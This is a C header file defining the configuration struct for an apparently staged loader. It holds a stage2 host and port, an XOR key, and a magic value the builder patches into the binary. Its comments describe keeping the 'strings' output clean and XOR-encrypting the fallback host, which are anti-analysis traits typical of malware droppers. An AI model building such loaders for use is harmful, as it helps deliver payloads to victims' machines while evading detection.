/*
 * Stage 1 configuration.
 *
 * The builder tool patches a populated stage1_config_t into the built
 * binary. At image-load time, g_config's initializer supplies a safe
 * default (empty host; main() falls back to an XOR-encrypted loopback
 * default on Windows). The magic is non-ASCII to keep `strings` clean.
 */

#ifndef CONFIG_H
#define CONFIG_H

#include <stdint.h>
#include <stddef.h>

/* Non-ASCII magic — does not match any printable token.
 * Four bytes: DE AD C0 DE. */
#define STAGE1_MAGIC 0xDEADC0DEu

#define MAX_URL_LEN 512
#define MAX_KEY_LEN 32

typedef struct {
    uint32_t magic;
    uint32_t flags;
    uint16_t stage2_port;
    uint16_t stage_number;
    uint8_t  xor_key[MAX_KEY_LEN];
    uint8_t  xor_key_len;
    uint8_t  reserved[3];
    char     stage2_host[MAX_URL_LEN];
} stage1_config_t;

extern stage1_config_t g_config;

static inline int config_valid(const stage1_config_t *cfg) {
    return cfg->magic == STAGE1_MAGIC
        && cfg->xor_key_len > 0
        && cfg->xor_key_len <= MAX_KEY_LEN;
}

#endif /* CONFIG_H */
